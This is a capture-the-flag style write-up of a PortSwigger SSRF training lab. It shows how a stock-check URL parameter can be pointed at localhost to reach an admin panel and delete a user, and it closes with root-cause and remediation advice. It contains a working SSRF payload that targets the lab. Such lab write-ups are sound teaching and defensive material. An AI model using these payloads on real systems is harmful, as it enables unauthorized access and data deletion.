## Metadata

- **Difficulty:** Apprentice
- **Category:** SSRF
- **Lab URL:** [Lab: Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
- **Date Solved:** 22/4/2026
## Vulnerability Summary

The app is vulnerable to **Server-side Request Forgery** (SSRF). Specifically, we can cause the app to make an HTTP request to the server that is hosting the app via its loopback network interface by supplying a URL with the host name `localhost`. This way, we are able to fetch the content of the `/admin` URL and gain administrative privileges.
## Reconnaissance

Click on the "View details" button under any random item, then, at `url/product?productId=number`, intercept the `POST /product/stock` request where you click "Check stock" with Burp Suite proxy. On the intercepted request's body, there is a line that reads something like:
`stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1`
The server retrieves the stock status by passing this URL to the relevant back-end API endpoint via a front-end HTTP request.
Modifying the request to specify a URL local to the server: `stockApi=http://localhost/admin` yields an HTTP response with a status code of `200 OK` that, in the response body, reads:
```HTML
<a href="/admin">
	Admin panel
</a>
<p>
	|
</p>
<a href="/my-account">
	My account
</a>

...

<section>
    <h1>
	    Users 
    </h1>
    <div>
        <span>
	        wiener - 
	    </span>
        <a href="/admin/delete?username=wiener">
	        Delete
	    </a>
    </div>
    <div>
        <span>
	        carlos - 
		</span>
        <a href="/admin/delete?username=carlos">
	        Delete
	    </a>
    </div>
</section>
```
This suggests that we have bypassed access controls, and gained administrative functionalities.
## Exploitation Steps

1. Click on the "View details" button under any random item. You will be taken to `url/product?productId=[number]`.
2. Intercept the request where you click "Check stock" with Burp Suite proxy.
3. Modify the value of the `stockApi` field to `http://localhost/admin/delete?username=carlos`, then send the request.
4. Observe that you receive a `302 Found` HTTP Response that signifies a redirection. Go on to the website. You should see that lab is solved.
## Payload Used

`stockApi=http://localhost/admin/delete?username=carlos`
The app fails to validate user-controllable URL before making back-end HTTP requests. Furthermore, the server's flawed trust mechanisms handle requests from the local machine differently than ordinary requests. These factors combined allows us bypass access controls, thus granting us administrative rights.
## Root Cause

The application takes a user-controlled parameter (`stockApi`) and uses it directly to construct a backend network request without verifying if the target is intended or safe. It also implicitly trusts requests that come from the local machine. These factors allowing for SSRF exploitation.
## Remediation

 - Change the `stockApi` parameter to accept only the necessary data identifiers, such as `productId` and `storeId`. The server backend should construct the internal API request using these safe identifiers rather than trusting a client-supplied URL.
- If passing a URL is unavoidable, implement strict server-side validation using a whitelist. The application must verify that the user-supplied input exactly matches a predefined list of permitted URLs or hostnames before initiating the HTTP request. Relying on blocklisting (e.g., blocking `localhost` or `127.0.0.1`) is bad, as attackers can easily bypass this using alternative encodings or DNS rebinding.
- Implement egress filtering on the server. Deny all outbound traffic by default, and only permit connections to the specific internal IP addresses and ports required for the application to function.
